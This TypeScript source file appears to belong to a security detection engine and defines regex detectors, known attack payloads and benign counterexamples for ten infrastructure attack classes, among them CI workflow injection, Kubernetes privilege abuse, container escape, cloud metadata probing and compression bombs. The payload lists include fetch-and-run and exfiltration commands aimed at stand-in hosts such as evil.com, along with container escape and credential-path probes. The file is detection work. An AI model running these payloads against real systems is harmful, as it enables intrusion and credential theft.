import type { InvariantClass, InvariantClassModule } from '../types.js'
import { deepDecode } from '../encoding.js'

const GHA_SET_OUTPUT_RE = /::set-output\s+name=[^:\r\n]+::/i
const GHA_ADD_MASK_RE = /::add-mask::/i
const GHA_SET_ENV_RE = /::set-env\s+name=[^:\r\n]+::/i
const GHA_USER_EXPR_IN_RUN_RE = /run\s*:\s*[^\n]*\$\{\{\s*github\.event\.(?:issue|pull_request|comment|head_commit|inputs)\.[^}]+\}\}/i
const GHA_EXPR_INJECTION_RE = /(?:\$\{\{[^}]+\}\}|\$\([^)]+\)|`[^`]+`|\$[A-Za-z_][A-Za-z0-9_]*)/
const GHA_GITHUB_ENV_WRITE_RE = /(?:>>\s*\$GITHUB_ENV|\$GITHUB_ENV\s*<<|GITHUB_ENV=)/i
const GHA_EXFIL_RE = /\b(?:curl|wget|Invoke-WebRequest|nc|scp)\b/i

const K8S_SUBJECT_ACCESS_RE = /\/apis\/authorization\.k8s\.io\/v1(?:beta1)?\/subjectaccessreviews/i
const K8S_SYSTEM_SECRETS_RE = /\/api\/v1\/namespaces\/kube-system\/secrets(?:\/|\b)/i
const K8S_WILDCARD_VERBS_RE = /(?:verbs\s*:\s*\[\s*\*\s*\]|["']verbs["']\s*:\s*\[\s*["']\*["']\s*\])/i
const K8S_EXEC_ATTACH_SYSTEM_RE = /(?:\/api\/v1\/namespaces\/kube-system\/pods\/[^\/\s]+\/(?:exec|attach)|\bkubectl\s+exec\b[^\n]*(?:--namespace(?:=|\s+)kube-system|-n\s+kube-system))/i
const K8S_TTY_EXEC_RE = /\bkubectl\s+exec\b[^\n]*(?:--stdin|-i)[^\n]*(?:--tty|-t)/i
const K8S_ADMISSION_WEBHOOK_BYPASS_RE = /(?:namespaceSelector.*kube-system|dryRun.*true|sideEffects.*None|failurePolicy.*Ignore|webhookconfig.*skip)/i

const TF_FILE_ABS_RE = /\$\{\s*file\s*\(\s*["']\/(?:etc|proc|root|home|var|tmp)[^"']*["']\s*\)\s*\}/i
const TF_LOCAL_EXEC_URL_RE = /provisioner\s+"local-exec"[\s\S]{0,260}command\s*=\s*["'][^"']*(?:curl|wget)[^"']*(?:https?:\/\/|[A-Za-z0-9.-]+\.[A-Za-z]{2,})[^"']*["']/i
const TF_DATA_EXTERNAL_RESULT_RE = /data\.external\.[A-Za-z0-9_-]+\.result/i
const TF_DATA_EXTERNAL_CMD_RE = /data\s+"external"[\s\S]{0,260}(?:program|query)\s*=\s*\[[^\]]*(?:bash|sh|python|curl|wget|nc|powershell)/i

const HELM_CHART_INJECTION_RE = /\{\{[^}]*(?:\.Values\.[^}]*\|\s*exec|tpl\s+\.Values|\|\s*sh\b|\|\s*bash\b|exec\s*\.(?:Command|OS\.Exec))/i

const DOCKER_PROC_PID1_RE = /\/proc\/1\/(?:root|mounts|ns|cgroup|environ|fd)(?:\/|\b)/i
const DOCKER_SOCK_RE = /(?:\/var\/run\/docker\.sock|docker\.sock)/i
const DOCKER_NSENTER_RE = /\bnsenter\s+--target\s+1\b[^\n]*(?:--mount|-m)[^\n]*(?:--uts|-u)/i
const DOCKER_PRIVILEGED_RE = /(?:--privileged\b|["']?Privileged["']?\s*:\s*true)/i

const META_AWS_IPV6_RE = /(?:http:\/\/)?fd00:ec2::254\/latest\/meta-data\//i
const META_GCP_RE = /metadata\.google\.internal\/computeMetadata\/v1\/instance\/service-accounts\/default\/token/i
const META_AZURE_RE = /169\.254\.169\.254\/metadata\/instance(?:\?|\/|\b)/i
const META_IMDSV2_PUT_RE = /\bPUT\b[\s\S]{0,180}169\.254\.169\.254[\s\S]{0,220}x-aws-ec2-metadata-token-ttl-seconds\s*:/i

const TRANSFER_ENCODING_RE = /^transfer-encoding:\s*(.+)$/gim
const CONTENT_DISPOSITION_RE = /^content-disposition:\s*([^\r\n]+)$/gim
const CONTENT_TYPE_MULTIPART_RE = /^content-type:\s*multipart\/form-data\b/i
const FILE_SIZE_PARAM_RE = /\bsize\s*=\s*(\d{7,})\b/i
const MULTIPART_SIZE_RE = /content-disposition:[^\r\n]*;[^\r\n]*\bname\s*=\s*["']?[^"'\r\n]+["']?[\s;]*\bfilename\s*=\s*["'][^"']+\b["']/i

const HEADER_LINE_RE = /^([!$%&'*+.^_`|~A-Za-z0-9:-]+):\s*(.+)\s*$/i

const GRAPHQL_FRAGMENT_DEF_RE = /\bfragment\s+([A-Za-z_][A-Za-z0-9_]*)\s+on\s+[A-Za-z_][A-Za-z0-9_]*\s*\{([\s\S]*?)\}/g
const GRAPHQL_SPREAD_RE = /\.\.\.\s*([A-Za-z_][A-Za-z0-9_]*)/g
function getHeaderLines(input: string, header: string): string[] {
    const re = new RegExp(`^${header}\\s*:\\s*(.+)$`, 'gim')
    return Array.from(input.matchAll(re)).map((m) => m[1].trim())
}

function parseIntHeader(input: string, header: string): number[] {
    const re = new RegExp(`^${header}\\s*:\\s*(\\d+)\\s*$`, 'gim')
    return Array.from(input.matchAll(re)).map((m) => parseInt(m[1], 10)).filter((n) => Number.isFinite(n))
}

function getHeaderValues(input: string): { [name: string]: string[] } {
    const lines = input.split(/\r?\n/)
    const out: { [name: string]: string[] } = {}
    for (const line of lines) {
        const m = line.match(HEADER_LINE_RE)
        if (!m) continue
        const name = m[1].toLowerCase()
        const value = m[2].trim()
        if (!out[name]) out[name] = []
        out[name].push(value)
    }
    return out
}

function getIntBase64HeaderValues(input: string): string[] {
    const values = getHeaderLines(input, 'content-encoding').flatMap((v) => v.split(',').map((h) => h.trim()))
    return values
}

function looksLikeZipMagicBase64(raw: string): boolean {
    try {
        const cleaned = raw.replace(/\s/g, '')
        if (cleaned.length < 12) return false
        const bytes = Buffer.from(cleaned, 'base64')
        return bytes.length >= 4 && bytes[0] === 0x50 && bytes[1] === 0x4b && bytes[2] === 0x03 && bytes[3] === 0x04
    } catch {
        return false
    }
}

function isMultipartZipOversized(input: string): boolean {
    const lines = input.split(/\r?\n/)
    const hasMultipart = lines.some((line) => CONTENT_TYPE_MULTIPART_RE.test(line))
    if (!hasMultipart) return false
    const contentLengths = parseIntHeader(input, 'content-length')
    const hasHugeContentLength = contentLengths.some((n) => n > 10 * 1024 * 1024)
    const hasDispositionHeader = lines.some((line) => CONTENT_DISPOSITION_RE.test(line))
    if (!hasDispositionHeader) return false

    const hasLargeDispositionSize = lines.some((line) => MULTIPART_SIZE_RE.test(line) && FILE_SIZE_PARAM_RE.test(line))
    const hugeByDisposition = lines.some((line) => {
        if (!FILE_SIZE_PARAM_RE.test(line)) return false
        const m = line.match(FILE_SIZE_PARAM_RE)
        return m ? parseInt(m[1], 10) > 10 * 1024 * 1024 : false
    })

    return hasHugeContentLength || hasLargeDispositionSize || hugeByDisposition
}

function maxGraphQLDepth(input: string): number {
    let depth = 0
    let maxDepth = 0
    for (const ch of input) {
        if (ch === '{') {
            depth++
            if (depth > maxDepth) maxDepth = depth
        } else if (ch === '}') {
            depth = Math.max(0, depth - 1)
        }
    }
    return maxDepth
}

function hasCircularFragments(input: string): boolean {
    const defs = Array.from(input.matchAll(GRAPHQL_FRAGMENT_DEF_RE))
    if (defs.length < 2) return false
    const refs = new Map<string, Set<string>>()
    for (const def of defs) {
        const name = def[1]
        const body = def[2]
        const spreadRefs = new Set<string>()
        for (const spread of body.matchAll(GRAPHQL_SPREAD_RE)) {
            spreadRefs.add(spread[1])
        }
        refs.set(name, spreadRefs)
    }

    const visiting = new Set<string>()
    const visited = new Set<string>()
    const dfs = (node: string): boolean => {
        if (visiting.has(node)) return true
        if (visited.has(node)) return false
        visiting.add(node)
        for (const next of refs.get(node) ?? []) {
            if (dfs(next)) return true
        }
        visiting.delete(node)
        visited.add(node)
        return false
    }

    for (const name of refs.keys()) {
        if (dfs(name)) return true
    }
    return false
}

function hasFieldMultiplication(input: string, minRepeats = 50): boolean {
    const countsByDepth = new Map<number, Map<string, number>>()
    const keywordBlacklist = new Set([
        'query',
        'mutation',
        'subscription',
        'fragment',
        'on',
        'schema',
        'type',
        'queryType',
        'mutationType',
        'subscriptionType',
    ])

    const getCountMap = (depth: number): Map<string, number> => {
        let map = countsByDepth.get(depth)
        if (!map) {
            map = new Map<string, number>()
            countsByDepth.set(depth, map)
        }
        return map
    }

    let depth = 0
    let i = 0
    while (i < input.length) {
        const ch = input[i]
        if (ch === '#') {
            while (i < input.length && input[i] !== '\n') i++
            continue
        }
        if (ch === '{' || ch === '}') {
            depth = ch === '{' ? depth + 1 : Math.max(0, depth - 1)
            i++
            continue
        }
        if (ch === '"') {
            i++
            while (i < input.length) {
                if (input[i] === '\\') {
                    i += 2
                    continue
                }
                if (input[i] === '"') {
                    i++
                    break
                }
                i++
            }
            continue
        }
        if (/[A-Za-z_]/.test(ch) && depth > 0) {
            let j = i + 1
            while (j < input.length && /[A-Za-z0-9_]/.test(input[j])) j++
            const token = input.slice(i, j)
            if (!keywordBlacklist.has(token)) {
                const prev = input.slice(Math.max(0, i - 3), i)
                if (!prev.endsWith('...')) {
                    const map = getCountMap(depth)
                    const next = (map.get(token) ?? 0) + 1
                    map.set(token, next)
                    if (next >= minRepeats) return true
                }
            }
            i = j
            continue
        }
        i++
    }
    return false
}

export const githubActionsInjection: InvariantClassModule = {
    id: 'github_actions_injection',
    description: 'GitHub Actions workflow command injection via user-controlled expressions, command directives, and environment file writes',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.88 },
    mitre: ['T1195.002', 'T1059.004'],
    cwe: 'CWE-94',
    knownPayloads: [
        'echo "::set-output name=result::$(id)"',
        'run: echo ${{ github.event.issue.title }}',
        'echo "::add-mask::${{ secrets.AWS_SECRET_ACCESS_KEY }}"\ncurl https://evil.example/exfil',
        'echo "MALICIOUS=$(curl https://evil.example)" >> $GITHUB_ENV',
    ],
    knownBenign: [
        'echo "hello"',
        'run: npm install',
        'echo "::notice::Build complete"',
    ],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        if (GHA_SET_OUTPUT_RE.test(d)) return true
        if (GHA_SET_ENV_RE.test(d) && GHA_EXPR_INJECTION_RE.test(d)) return true
        if (GHA_USER_EXPR_IN_RUN_RE.test(d)) return true
        if (GHA_GITHUB_ENV_WRITE_RE.test(d) && GHA_EXPR_INJECTION_RE.test(d)) return true
        if (GHA_ADD_MASK_RE.test(d) && (GHA_EXFIL_RE.test(d) || /secrets?\./i.test(d))) return true
        return false
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'echo "::set-output name=result::$(id)"',
            'run: echo ${{ github.event.issue.title }}',
            'echo "::add-mask::${{ secrets.AWS_SECRET_ACCESS_KEY }}"\ncurl https://evil.example/exfil',
            'echo "MALICIOUS=$(curl https://evil.example)" >> $GITHUB_ENV',
        ]
        return variants.slice(0, count)
    },
}

export const kubernetesRbacAbuse: InvariantClassModule = {
    id: 'kubernetes_rbac_abuse',
    description: 'Kubernetes RBAC abuse attempts using authz probing, wildcard privileges, and system namespace exec/secret access',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1068', 'T1078'],
    cwe: 'CWE-269',
    knownPayloads: [
        '/apis/authorization.k8s.io/v1/subjectaccessreviews',
        'kubectl exec --stdin --tty pod/etcd-0 --namespace kube-system -- sh',
        '/api/v1/namespaces/kube-system/secrets',
        'rules: [{ apiGroups:["*"], resources:["*"], verbs:[*] }]',
    ],
    knownBenign: [
        '/api/v1/pods',
        '/api/v1/services',
        'kubectl get pods',
    ],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return (
            K8S_SUBJECT_ACCESS_RE.test(d) ||
            K8S_SYSTEM_SECRETS_RE.test(d) ||
            K8S_WILDCARD_VERBS_RE.test(d) ||
            K8S_EXEC_ATTACH_SYSTEM_RE.test(d) ||
            K8S_TTY_EXEC_RE.test(d)
        )
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            '/apis/authorization.k8s.io/v1/subjectaccessreviews',
            'kubectl exec --stdin --tty pod/etcd-0 --namespace kube-system -- sh',
            '/api/v1/namespaces/kube-system/secrets',
            'rules: [{ apiGroups:["*"], resources:["*"], verbs:[*] }]',
        ]
        return variants.slice(0, count)
    },
}

export const terraformInjection: InvariantClassModule = {
    id: 'terraform_injection',
    description: 'Terraform HCL injection via dangerous interpolation, local-exec abuse, and external data command execution',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.86 },
    mitre: ['T1190', 'T1059.004'],
    cwe: 'CWE-94',
    knownPayloads: [
        '${file("/etc/passwd")}',
        'resource "null_resource" "x" { provisioner "local-exec" { command = "curl evil.com/p.sh | sh" } }',
        'data.external.cmd.result',
        'data "external" "pwn" { program = ["bash","-c","curl https://evil.com"] }',
    ],
    knownBenign: [
        '${var.region}',
        'resource "aws_s3_bucket" "main" {}',
        'var.instance_type',
    ],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return TF_FILE_ABS_RE.test(d) || TF_LOCAL_EXEC_URL_RE.test(d) || TF_DATA_EXTERNAL_RESULT_RE.test(d) || TF_DATA_EXTERNAL_CMD_RE.test(d)
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            '${file("/etc/passwd")}',
            'resource "null_resource" "x" { provisioner "local-exec" { command = "curl evil.com/p.sh | sh" } }',
            'data.external.cmd.result',
            'data "external" "pwn" { program = ["bash","-c","curl https://evil.com"] }',
        ]
        return variants.slice(0, count)
    },
}

export const dockerEscapeIndicator: InvariantClassModule = {
    id: 'docker_escape_indicator',
    description: 'Container escape indicators via host PID1 traversal, docker socket access, nsenter, and privileged container creation',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.91 },
    mitre: ['T1611', 'T1068'],
    cwe: 'CWE-250',
    knownPayloads: [
        'POST /containers/create?name=pwn {"HostConfig":{"Privileged":true}}',
        '/proc/1/root/../../../etc/passwd',
        '/var/run/docker.sock',
        'nsenter --target 1 --mount --uts --ipc --net sh',
    ],
    knownBenign: [
        'docker build .',
        'docker run app',
        '/proc/self/status',
    ],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return DOCKER_PROC_PID1_RE.test(d) || DOCKER_SOCK_RE.test(d) || DOCKER_NSENTER_RE.test(d) || DOCKER_PRIVILEGED_RE.test(d)
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'POST /containers/create?name=pwn {"HostConfig":{"Privileged":true}}',
            '/proc/1/root/../../../etc/passwd',
            '/var/run/docker.sock',
            'nsenter --target 1 --mount --uts --ipc --net sh',
        ]
        return variants.slice(0, count)
    },
}

export const cloudMetadataAdvanced: InvariantClassModule = {
    id: 'cloud_metadata_advanced',
    description: 'Advanced cloud metadata probing across AWS/GCP/Azure endpoints, including IMDSv2 token acquisition behavior',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1552', 'T1190'],
    cwe: 'CWE-918',
    knownPayloads: [
        'http://fd00:ec2::254/latest/meta-data/iam/security-credentials/',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'PUT http://169.254.169.254/latest/api/token\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600',
    ],
    knownBenign: [
        'http://example.com/metadata',
        '/api/metadata',
        'GET /v1/public/metadata',
    ],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return META_AWS_IPV6_RE.test(d) || META_GCP_RE.test(d) || META_AZURE_RE.test(d) || META_IMDSV2_PUT_RE.test(d)
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'http://fd00:ec2::254/latest/meta-data/iam/security-credentials/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'PUT http://169.254.169.254/latest/api/token\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600',
        ]
        return variants.slice(0, count)
    },
}

export const k8sAdmissionWebhookBypass: InvariantClassModule = {
    id: 'k8s_admission_webhook_bypass' as InvariantClass,
    description: 'Kubernetes admission webhook bypass via namespace scope, dryRun annotation, or sideEffects manipulation',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1612'],
    cwe: 'CWE-284',
    knownPayloads: [
        'namespaceSelector: matchExpressions: key: kubernetes.io/metadata.name NotIn kube-system',
        'dryRun: true requestKind: Pod webhookConfig:',
        'failurePolicy: Ignore sideEffects: None',
    ],
    knownBenign: [
        'kubectl apply -f deploy.yaml',
        'kubectl get pods',
        'apiVersion: apps/v1 kind: Deployment',
    ],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return K8S_ADMISSION_WEBHOOK_BYPASS_RE.test(d)
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'namespaceSelector: matchExpressions: key: kubernetes.io/metadata.name NotIn kube-system',
            'dryRun: true requestKind: Pod webhookConfig:',
            'failurePolicy: Ignore sideEffects: None',
        ]
        return variants.slice(0, count)
    },
}

export const helmChartInjection: InvariantClassModule = {
    id: 'helm_chart_injection' as InvariantClass,
    description: 'Helm chart template injection via dangerous functions and user-controlled tpl rendering',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.87 },
    mitre: ['T1059.004'],
    cwe: 'CWE-94',
    knownPayloads: [
        '{{ .Values.command | exec }}',
        '{{ tpl .Values.config . }}',
        '{{ exec .OS.Exec .Values.cmd }}',
    ],
    knownBenign: [
        '{{ .Values.image.tag }}',
        '{{ .Release.Name }}-app',
        '{{ include "labels" . }}',
    ],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return HELM_CHART_INJECTION_RE.test(d)
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            '{{ .Values.command | exec }}',
            '{{ tpl .Values.config . }}',
            '{{ exec .OS.Exec .Values.cmd }}',
        ]
        return variants.slice(0, count)
    },
}

export const compressionBomb: InvariantClassModule = {
    id: 'compression_bomb',
    description: 'Potential compression bomb payloads using nested compression, oversize zip indicators, and multipart oversized declarations',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.88 },
    cwe: 'CWE-400',
    mitre: ['T1499.002'],
    knownPayloads: [
        'Content-Encoding: gzip, gzip, gzip\r\nContent-Length: 20971520\r\nTransfer-Encoding: chunked\r\nContent-Type: application/octet-stream',
        'Content-Encoding: br\r\nTransfer-Encoding: chunked\r\nContent-Length: 41943040\r\nContent-Type: application/zip',
        'data:application/zip;base64,UEsDBAoAAAAAAIAAAAAAAAAAAAAAAAAAAAAA', // PK\x03\x04 header in base64
        'POST /upload HTTP/1.1\r\nContent-Type: multipart/form-data; boundary=----bomb\r\nContent-Length: 50331648\r\nContent-Disposition: form-data; name="file"; filename="42.zip"; size=50331648; key="upload"\r\nContent-Type: application/zip',
        'Content-Disposition: form-data; name="archive"; filename="bomb.zip"; size=20485760; type=application/x-zip-compressed\r\nContent-Type: multipart/form-data',
    ],
    knownBenign: [
        'Content-Encoding: gzip\r\nContent-Length: 2048\r\nContent-Type: application/json',
        'Content-Encoding: br\r\nContent-Length: 512\r\nContent-Type: text/html',
        'data:application/json;base64,eyJmb28iOiAiYmFyIn0=',
        'Content-Disposition: form-data; name="avatar"; filename="avatar.png"; size=20480\r\nContent-Type: image/png',
    ],
    detect: (input: string): boolean => {
        const lower = input.toLowerCase()
        if (
            !lower.includes('content-encoding:')
            && !lower.includes('content-length:')
            && !lower.includes('content-disposition:')
            && !lower.includes('multipart/form-data')
            && !lower.includes('application/zip')
            && !lower.includes('data:application/zip')
            && !lower.includes('pk\x03\x04')
            && input.indexOf('PK\x03\x04') < 0
        ) {
            return false
        }

        const d = deepDecode(input)

        const contentLengths = parseIntHeader(d, 'content-length')
        const hasLargeLength = contentLengths.some((n) => n > 10 * 1024 * 1024)
        const hasChunked = Array.from(d.matchAll(TRANSFER_ENCODING_RE)).some((m) => /\bchunked\b/i.test(m[1] ?? ''))
        const hasCompressionHeader = getIntBase64HeaderValues(d).some((v) => /(gzip|deflate|br)/i.test(v))
        const nestedCompression = getIntBase64HeaderValues(d).some((v) => (v.toLowerCase().split(',').filter((x) => x.trim() === 'gzip').length >= 3))
        const fileNameHint = /\b(?:42\.zip|10gb\.zip|bomb\.zip|zbsm\.zip)\b/i.test(d)
        const zipRatioHint = Array.from(d.matchAll(/data:application\/(?:zip|x-zip-compressed)[^,\r\n]*,([A-Za-z0-9+/=]+)/gi)).some((m) => looksLikeZipMagicBase64(m[1]))
        const zipMagicLiteralHint = /PK\x03\x04/.test(d)
        const oversizedMultipart = isMultipartZipOversized(d)

        return (hasLargeLength && hasChunked && hasCompressionHeader)
            || nestedCompression
            || fileNameHint
            || zipRatioHint
            || zipMagicLiteralHint
            || oversizedMultipart
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'Content-Encoding: gzip, gzip, gzip\r\nContent-Length: 20971520\r\nTransfer-Encoding: chunked\r\nContent-Type: application/octet-stream',
            'data:application/zip;base64,UEsDBAoAAAAAAIAAAAAAAAAAAAAAAAAAAAAA',
            'POST /upload HTTP/1.1\r\nContent-Type: multipart/form-data; boundary=----bomb\r\nContent-Length: 50331648\r\nContent-Disposition: form-data; name=\"file\"; filename=\"42.zip\"; size=50331648\r\nContent-Type: application/zip',
            'Content-Encoding: br\r\nTransfer-Encoding: chunked\r\nContent-Length: 41943040\r\nContent-Type: application/gzip',
            'Content-Disposition: form-data; name=\"a\"; filename=\"bomb.zip\"; size=20485760\r\nContent-Type: multipart/form-data',
        ].slice(0, count)
        return variants
    },
}

export const http2PseudoHeaderInjection: InvariantClassModule = {
    id: 'http2_pseudo_header_injection',
    description: 'HTTP/2 pseudo-header desync and malformed request pathing attacks',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.91 },
    mitre: ['T1190'],
    cwe: 'CWE-444',
    knownPayloads: [
        ':method: CONNECT\r\n:scheme: https\r\n:authority: api.internal\r\n:path: /',
        ':method: GET\r\n:scheme: https\r\n:authority: example.com\r\n:path: https://evil.example/\r\nhost: example.com',
        ':method: OPTIONS\r\n:scheme: https\r\n:authority: api.internal\r\n:path: *',
        ':method: GET\r\n:method: POST\r\n:path: /v1\r\n:path: /v2\r\n:authority: bad.example\r\nhost: good.example',
        ':method: GET\r\n:scheme: javascript:alert(1)\r\n:authority: api.example\r\n:path: /api%0d%0aX-Injected:true',
    ],
    knownBenign: [
        ':method: GET\r\n:scheme: https\r\n:authority: api.example\r\n:path: /v1/status\r\nhost: api.example',
        ':method: POST\r\n:scheme: https\r\n:authority: example.com\r\n:path: /users/42\r\nhost: example.com',
        ':method: GET\r\n:scheme: https\r\n:authority: example.com\r\n:path: /users\r\naccept: application/json',
        ':method: OPTIONS\r\n:scheme: https\r\n:authority: example.com\r\n:path: /',
    ],
    detect: (input: string): boolean => {
        const lower = input.toLowerCase()
        if (
            !lower.includes(':method:')
            && !lower.includes(':path:')
            && !lower.includes(':authority:')
            && !lower.includes(':scheme:')
        ) {
            return false
        }

        const d = deepDecode(input)

        const headers = getHeaderValues(d)
        const methods = headers[':method'] ?? []
        const paths = headers[':path'] ?? []
        const authorities = headers[':authority'] ?? []
        const scheme = headers[':scheme'] ?? []
        const hostHeaders = headers['host'] ?? []
        const hasPseudoHeaderContext = methods.length + paths.length + authorities.length + scheme.length > 0

        if (!hasPseudoHeaderContext) return false
        if (methods.length !== 1 || methods.some((v) => v.trim() === '*')) return true
        if (methods.some((m) => /^(connect|trace|track)$/i.test(m.trim()))) return true
        if (methods.some((m) => /^options$/i.test(m.trim())) && paths.some((p) => p.trim() === '*')) return true

        if (paths.length !== 1) return true
        const path = paths[0]
        if (/%0d%0a|%0a%0d|%00/i.test(path) || /[\r\n\0]/.test(path)) return true
        if (/https?:\/\//i.test(path) || path.startsWith('javascript:') || path.startsWith('data:')) return true

        const badScheme = scheme.some((s) => /^javascript:|^data:/i.test(s.trim()))
        if (badScheme) return true

        if (authorities.length && hostHeaders.length && authorities[0].toLowerCase() !== hostHeaders[0].toLowerCase()) return true
        return false
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            ':method: CONNECT\r\n:scheme: https\r\n:authority: api.internal\r\n:path: /',
            ':method: GET\r\n:scheme: https\r\n:authority: example.com\r\n:path: https://evil.example/\r\nhost: example.com',
            ':method: OPTIONS\r\n:scheme: https\r\n:authority: api.internal\r\n:path: *',
            ':method: GET\r\n:method: POST\r\n:path: /v1\r\n:path: /v2\r\n:authority: bad.example\r\nhost: good.example',
            ':method: GET\r\n:scheme: javascript:alert(1)\r\n:authority: api.example\r\n:path: /api%0d%0aX-Injected:true',
        ]
        return variants.slice(0, count)
    },
}

export const graphqlDepthAttack: InvariantClassModule = {
    id: 'graphql_depth_attack',
    description: 'GraphQL deep-nesting, circular fragment, and field-multiplication attacks designed for server-side exhaustion',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.85, minInputLength: 50 },
    cwe: 'CWE-400',
    mitre: ['T1499'],
    knownPayloads: [
        '{ a { b { c { d { e { f { g { h { i { j { k { l { m { n { o { p { q { r } } } } } } } } } } } } } } } } }',
        'query { x { y { z { a { b { c { d { e { f { g { h { i { j { k { l { m { __schema { queryType { fields { name } } } } } } } } } } } } } } } } } } }',
        'query { user { id ...FragA ...FragB } fragment FragA on User { ...FragB avatar { id name } } fragment FragB on User { ...FragA } query { __schema { types { name fields { name type { name ofType { name } } } } } __type(name: "User") { name fields { name type { name ofType { name fields { name } } } } } } }',
    ],
    knownBenign: [
        '{ user { id name profile { city } } }',
        'query { viewer { id name friends { name } } }',
        '{ post { id title author { name } comments { text } } }',
        'mutation { updateUser(input:{id:1}) { id name } }',
    ],
    detect: (input: string): boolean => {
        if (!input.includes('{') || input.length < 50) return false
        const d = deepDecode(input)
        const depth = maxGraphQLDepth(d)
        const repeat = hasFieldMultiplication(d, 50)
        const circular = hasCircularFragments(d)
        const hasIntrospectionAbuse = /__schema/i.test(d) && /__type/i.test(d) && depth >= 10

        return depth >= 10 || circular || repeat || hasIntrospectionAbuse
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            '{ a { b { c { d { e { f { g { h { i { j { k { l { m { n { o { p { q } } } } } } } } } } } } } } } }',
            'query { x { y { z { a { b { c { d { e { f { g { h { i { j { k { l { m { n { __schema { queryType { name } } } } } } } } } } } } } } } } } } }',
            '{ root { a { b { c { d { e { f { g { h { i { j { k { l { m { n { o { __schema { types { name } } __type(name: "User") { name fields { name type { name } } } } } } } } } } } } } } } } } } }',
        ]
        return variants.slice(0, count)
    },
}

export const INFRA_ATTACK_CLASSES: InvariantClassModule[] = [
    githubActionsInjection,
    kubernetesRbacAbuse,
    terraformInjection,
    dockerEscapeIndicator,
    cloudMetadataAdvanced,
    k8sAdmissionWebhookBypass,
    helmChartInjection,
    compressionBomb,
    http2PseudoHeaderInjection,
    graphqlDepthAttack,
]
